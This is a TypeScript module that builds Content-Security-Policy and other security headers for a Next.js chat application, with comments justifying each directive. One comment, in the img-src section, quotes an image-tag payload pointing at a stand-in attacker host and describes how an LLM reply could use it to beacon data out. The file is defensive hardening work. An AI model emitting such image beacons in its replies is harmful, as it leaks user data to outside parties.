/**
 * Security response headers (issue #501).
 *
 * Two surfaces consume this module:
 *
 *   - `next.config.ts` `headers()` — the STATIC, ENFORCING headers. These
 *     apply to every response Next serves, including `/_next/static/*` and
 *     `/public/*`, which the proxy matcher deliberately skips.
 *   - `src/proxy.ts` — the per-request, nonce-bearing CSP. A nonce cannot be
 *     computed in `next.config.ts` (that function runs once at server start,
 *     not per request), so the full policy has to be built in the proxy.
 *
 * This module must stay dependency-free: `next.config.ts` imports it, and the
 * config is evaluated outside the app's module graph (no `@/` alias, no
 * `server-only`, no Next runtime APIs).
 *
 * ## Rollout posture
 *
 * The full policy ships as `Content-Security-Policy-Report-Only`. A CSP that
 * breaks the app is worse than no CSP, and this repo deploys straight to a
 * live box. Report-only lets the browser tell us what would have broken
 * without breaking it.
 *
 * The genuinely low-risk directives ship ENFORCING immediately, in a separate
 * `Content-Security-Policy` header. Two CSP headers are intersected by the
 * browser, so this is well-defined: the enforcing header is a hard floor, the
 * report-only header is the candidate policy we are measuring.
 *
 * `frame-ancestors` is in the enforcing header specifically because it has no
 * effect in a report-only policy on some browsers, and clickjacking protection
 * is the one thing we do not want to defer.
 */

/** Directives that are safe to enforce on day one. */
const ENFORCED_DIRECTIVES = [
  // NOTE: `upgrade-insecure-requests` is appended to this list for production
  // in `enforcedCsp()` below — it is NOT in the report-only policy, because
  // browsers ignore it there and Chrome logs a console error on every page
  // load saying so. Observed during the verification sweep for #501.
  // Nothing in this app is ever framed. Belt-and-braces with X-Frame-Options
  // for pre-CSP2 clients.
  "frame-ancestors 'none'",
  // No <object>/<embed>/<applet> anywhere in the codebase.
  "object-src 'none'",
  // Stops injected markup from repointing relative URLs at another origin.
  "base-uri 'self'",
  // No form in the app posts off-origin. Sign in with Apple is a plain link
  // to /api/auth/apple-web/start, which 302s — not a cross-origin form POST.
  "form-action 'self'",
];

/**
 * The enforcing CSP. Deliberately tiny — every directive here has been
 * checked against the codebase and cannot break a working page.
 *
 * `upgrade-insecure-requests` is production-only. It has nothing to upgrade
 * (the app makes no http:// subresource request, and HSTS already covers the
 * origin), but it is a cheap guard against a future mixed-content mistake.
 * Left out in development so it cannot interfere with plain-http localhost.
 */
export function enforcedCsp(isDev: boolean): string {
  const directives = [...ENFORCED_DIRECTIVES];
  if (!isDev) directives.push("upgrade-insecure-requests");
  return directives.join("; ");
}

/**
 * Build the candidate (report-only) policy.
 *
 * @param nonce  Per-request base64 nonce. Next.js parses this back out of the
 *               header it receives on the request and stamps it onto every
 *               script tag it emits — see
 *               `next/dist/server/app-render/app-render.js`, which reads
 *               `content-security-policy` OR `content-security-policy-report-only`.
 *               That fallback is what makes a nonce work under report-only at
 *               all, and it is version-specific: verified against Next 16.2.4.
 * @param isDev  Development builds need `'unsafe-eval'` — React's dev build
 *               uses `eval` to rebuild server stacks in the browser, and
 *               Turbopack's HMR runtime evaluates modules the same way.
 *               Production needs neither.
 */
export function buildReportOnlyCsp(nonce: string, isDev: boolean): string {
  const directives = [
    "default-src 'self'",

    // `'self'` (not `'strict-dynamic'`) is the load-bearing source here.
    // Everything executable is same-origin: Next's own chunks under
    // /_next/static, and nothing else — there is no third-party script tag in
    // the app. `'strict-dynamic'` would *disable* `'self'` in CSP3 browsers
    // and take the `<link rel="preload" as="script">` tags Next emits with
    // it, which is a real regression, not a hardening.
    //
    // The nonce covers the inline bootstrap + RSC flight-data scripts Next
    // injects into the HTML document.
    //
    // Same-origin script injection is not a live vector: the only user-
    // controlled bytes served from this origin are chat attachments, and
    // /api/chat/attachments/[id] pins Content-Type: image/jpeg with nosniff.
    `script-src 'self' 'nonce-${nonce}'${isDev ? " 'unsafe-eval'" : ""}`,

    // `'unsafe-inline'` is unavoidable and intentional. React renders the
    // `style={{...}}` prop as an inline `style=""` ATTRIBUTE, and a nonce
    // cannot authorise a style attribute — only a <style> element. The app
    // uses inline styles throughout (chart gradients, the signin page, the
    // root <html> colorScheme). Splitting into style-src-elem/style-src-attr
    // does not help: browsers that do not support those directives fall back
    // to style-src, so the permissive value has to be here anyway.
    //
    // Note: a nonce is deliberately NOT included in style-src. Browsers
    // ignore `'unsafe-inline'` whenever a nonce or hash is present, which
    // would silently break every inline style attribute.
    "style-src 'self' 'unsafe-inline'",

    // The tightening the issue asked for. Previously unbounded: DOMPurify's
    // default config keeps `<img src="https://attacker/?leak">`, so an LLM
    // reply could beacon out even with scripts blocked.
    //   'self' — chat attachments via /api/chat/attachments/[id]
    //   data:  — inline SVG/PNG data URIs
    //   blob:  — URL.createObjectURL previews in ChatInput
    "img-src 'self' data: blob:",

    // next/font/google self-hosts the Geist woff2 files under /_next/static
    // at build time. No fonts.gstatic.com request is ever made.
    "font-src 'self'",

    // Every fetch the browser makes is same-origin (/api/*). Anthropic and
    // Cursor are called server-side only.
    "connect-src 'self'",

    "media-src 'none'",
    "worker-src 'none'",
    "manifest-src 'self'",
    "frame-src 'none'",

    ...ENFORCED_DIRECTIVES,
  ];

  return directives.join("; ");
}

/**
 * Static, enforcing headers for `next.config.ts`.
 *
 * NOTE: nginx / cloudflared sit in front of this app in production. If that
 * layer also emits any of these, the client sees BOTH values (comma-joined
 * for most headers; two independent policies for CSP, which the browser
 * intersects). That is safe-by-default but can be confusing to debug — the
 * app is the source of truth, the proxy config should not duplicate it.
 */
export function staticSecurityHeaders(
  isDev: boolean,
): { key: string; value: string }[] {
  const headers = [
    // The enforcing floor. The candidate policy rides alongside as
    // Content-Security-Policy-Report-Only, set by the proxy.
    { key: "Content-Security-Policy", value: enforcedCsp(isDev) },
    { key: "X-Content-Type-Options", value: "nosniff" },
    // Redundant with frame-ancestors above, kept for clients that predate CSP2.
    { key: "X-Frame-Options", value: "DENY" },
    // Not `no-referrer`: the proxy's route logging classifies same-origin
    // referrers, which needs the path on same-origin navigations. This still
    // sends origin-only cross-origin and nothing on downgrade.
    { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
    {
      key: "Permissions-Policy",
      value: [
        "accelerometer=()",
        "camera=()",
        "geolocation=()",
        "gyroscope=()",
        "magnetometer=()",
        "microphone=()",
        "payment=()",
        "usb=()",
      ].join(", "),
    },
  ];

  if (!isDev) {
    // Two years, subdomains included. `preload` is deliberately omitted: it is
    // an apex-domain commitment that is painful to unwind and is not this
    // app's call to make.
    headers.push({
      key: "Strict-Transport-Security",
      value: "max-age=63072000; includeSubDomains",
    });
  }

  return headers;
}

/** 128 bits of entropy, base64. Fresh per request — never cache or reuse. */
export function generateNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  let binary = "";
  for (const byte of bytes) binary += String.fromCharCode(byte);
  // btoa's output alphabet (A-Za-z0-9+/=) contains no HTML-escape characters,
  // which Next.js rejects when it parses the nonce back out of the header.
  return btoa(binary);
}
